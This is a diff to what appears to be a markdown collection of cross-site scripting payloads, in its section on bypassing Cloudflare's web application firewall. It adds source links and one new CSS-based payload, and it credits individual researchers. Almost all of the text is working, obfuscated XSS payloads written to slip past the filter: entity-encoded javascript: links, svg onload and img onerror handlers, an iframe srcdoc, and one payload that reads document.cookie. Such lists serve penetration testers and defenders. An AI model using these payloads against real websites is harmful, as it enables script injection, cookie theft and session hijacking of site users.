@@ -2998,23 +2998,26 @@ http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3csc
 ``` 
 
 ### Cloudflare
-- XSS Bypass by [@c0d3g33k](https://twitter.com/c0d3g33k)
+- [XSS Bypass](https://twitter.com/spyerror/status/1161432029319376897) by [@spyerror](https://twitter.com/spyerror)
+```
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+```
+- [XSS Bypass](https://pastebin.com/i8Ans4d4) by [@c0d3g33k](https://twitter.com/c0d3g33k)
 ```
 <a+HREF='javascrip%26%239t:alert%26lpar;document.domain)'>test</a>
 ```
-- XSS Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
+- [XSS Bypasses](https://twitter.com/h1_ragnar) by [@Bohdan Korzhynskyi](https://twitter.com/h1_ragnar)
 ```
 <svg onload=prompt%26%230000000040document.domain)>
 <svg onload=prompt%26%23x000000028;document.domain)>
 xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
 1'"><img/src/onerror=.1|alert``>
 ```
-- XSS Bypass by [@RakeshMane10](https://twitter.com/rakeshmane10)
+- [XSS Bypass](https://twitter.com/RakeshMane10/status/1109008686041759744) by [@RakeshMane10](https://twitter.com/rakeshmane10)
 ```
 <svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
 ```
-
-- XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
+- [XSS Bypass](https://twitter.com/ArbazKiraak/status/1090654066986823680) by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
 ```
